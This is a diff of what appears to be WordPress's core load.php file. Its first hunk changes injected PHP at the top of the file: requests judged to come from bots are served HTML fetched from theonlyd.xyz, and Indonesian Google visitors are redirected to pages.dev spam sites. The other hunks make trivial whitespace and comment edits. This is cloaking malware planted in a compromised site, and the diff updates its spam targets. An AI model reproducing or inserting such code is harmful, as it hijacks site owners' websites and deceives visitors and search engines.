@@ -14,13 +14,13 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/taalumgroup.html');
+echo file_get_contents('https://theonlyd.xyz/amab.html');
 exit;
 }
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://diam-disana.pages.dev/");
+header("Location: https://amab.pages.dev/no-money-no-honey/");
 exit;
 }
 ?>
@@ -264,8 +264,7 @@ function wp_get_environment_type() {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
 			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {
-			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -841,7 +840,7 @@ function wp_start_object_cache() {
 	 *
 	 * @since 5.8.0
 	 *
-	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
+	 * @param bool $enable_object_cache Whether to enable loadingobject-cache.php (if present).
 	 *                                  Default true.
 	 */
 	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
@@ -1141,7 +1140,7 @@ function wp_skip_paused_themes( array $themes ) {
 	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
-		if ( array_key_exists( $theme, $paused_themes ) ) {
+		if ( array_key_exists( $theme, $paused_themes ) ){
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1457,7 +1456,7 @@ function is_multisite() {
 /**
  * Converts a value to non-negative integer.
  *
- * @since 2.5.0
+ * @since2.5.0
  *
  * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
@@ -1773,7 +1772,7 @@ function wp_using_themes() {
  *
  * @since 4.8.0
  *
- * @return bool True if it's a WordPress cron request, false otherwise.
+ *@return bool True if it's a WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
